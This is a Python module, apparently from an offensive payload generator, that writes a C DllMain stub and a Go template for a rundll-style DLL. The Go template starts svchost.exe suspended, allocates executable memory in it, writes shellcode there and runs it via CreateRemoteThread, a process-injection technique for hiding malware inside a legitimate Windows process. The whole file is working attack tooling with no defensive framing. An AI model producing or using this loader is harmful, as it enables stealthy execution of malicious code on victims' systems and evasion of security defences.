import tempfile
import os

class rundll:
    def __init__(self, arguments):
        pass

    def __init__(self) -> None:
        with open('dllmain.c', 'w') as f:
            inline_assembly = """
#include <windows.h>

void OnProcessAttach();

DWORD WINAPI MyThreadFunction(LPVOID lpParam) {
    OnProcessAttach();
    return 0;
}

BOOL WINAPI DllMain(
    HINSTANCE _hinstDLL,  // handle to DLL module
    DWORD _fdwReason,     // reason for calling function
    LPVOID _lpReserved)   // reserved
{
    switch (_fdwReason) {
    case DLL_PROCESS_ATTACH:
		    // Initialize once for each new process.
        // Return FALSE to fail DLL load.
        {
            HANDLE hThread = CreateThread(NULL, 0, MyThreadFunction, 0, 0, NULL);
            // CreateThread() because otherwise DllMain() is highly likely to deadlock.
        }
        break;
    case DLL_PROCESS_DETACH:
        // Perform any necessary cleanup.
        break;
    case DLL_THREAD_DETACH:
        // Do thread-specific cleanup.
        break;
    case DLL_THREAD_ATTACH:
		// Do thread-specific initialization.
        break;
    }
    return TRUE; // Successful.
}
"""
            f.write(inline_assembly)

    def imports(self) -> list[str]:
        return ['"golang.org/x/sys/windows"',
                '"syscall"']

    def compilerOptions(self) -> list[str]:
        return []

    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
        return f"""
package main

import "C"

import (
{imports}
)

{codeblocks}

func main() {{}}

//export OnProcessAttach
func OnProcessAttach() {{

    {transformers}

	// Load DLLs and Procedures
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

    VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
    CreateRemoteThread := kernel32.NewProc("CreateRemoteThread")
    WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
    CloseHandle := kernel32.NewProc("CloseHandle")

	procInfo := &windows.ProcessInformation{{}}
	startupInfo := &windows.StartupInfo{{
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}}
	windows.CreateProcess(nil, syscall.StringToUTF16Ptr("C:\\\\windows\\\\system32\\\\svchost.exe"), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
    
	addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE), uintptr(windows.PAGE_EXECUTE_READWRITE))
    
    _ = windows.WriteProcessMemory(procInfo.Process, addr, &shellcode[0], uintptr(len(shellcode)), nil)
    
    thread, _, _ := CreateRemoteThread.Call(uintptr(procInfo.Process), 0, uintptr(0), addr, uintptr(0), 0, uintptr(0))
    
	WaitForSingleObject.Call(thread, 500)
	
    CloseHandle.Call(thread);
}}
"""